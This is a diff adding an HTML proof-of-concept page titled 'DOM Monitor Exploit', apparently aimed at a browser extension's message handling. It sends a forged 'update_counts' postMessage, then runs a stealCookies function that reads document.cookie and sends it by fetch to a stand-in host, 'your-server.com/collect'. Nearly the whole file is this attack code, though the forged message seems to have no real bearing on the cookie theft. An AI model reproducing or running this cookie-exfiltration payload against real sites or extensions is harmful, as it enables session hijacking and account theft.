@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>DOM Monitor Exploit</title>
+</head>
+<body>
+  <div id="start">Click to start</div>
+  <script>
+    // Function to steal cookies and exfiltrate
+    function stealCookies() {
+      // Get all cookies
+      const cookies = document.cookie;
+      // Send them to your server
+      fetch('https://your-server.com/collect?cookies=' + encodeURIComponent(cookies));
+      
+      // Or display them (for testing)
+      console.log("Cookies:", cookies);
+    }
+    
+    // The extension injects itself into every page
+    // Wait for it to load, then exploit the message passing
+    setTimeout(() => {
+      // This message will be processed by the extension
+      window.postMessage({
+        action: "update_counts",
+        counts: {
+          fetch: 0,
+          innerHTML: 0,
+          setAttribute: 0,
+          eval: 0
+        },
+        resourceCounts: {
+          script: 0,
+          img: 0,
+          stylesheet: 0,
+          font: 0,
+          other: 0
+        }
+        // The extension forwards the message with domain: event.origin to the background script
+      }, "*");
+      
+      // Now try to access any cookies
+      stealCookies();
+    }, 1000);
+  </script>
+</body>
+</html>
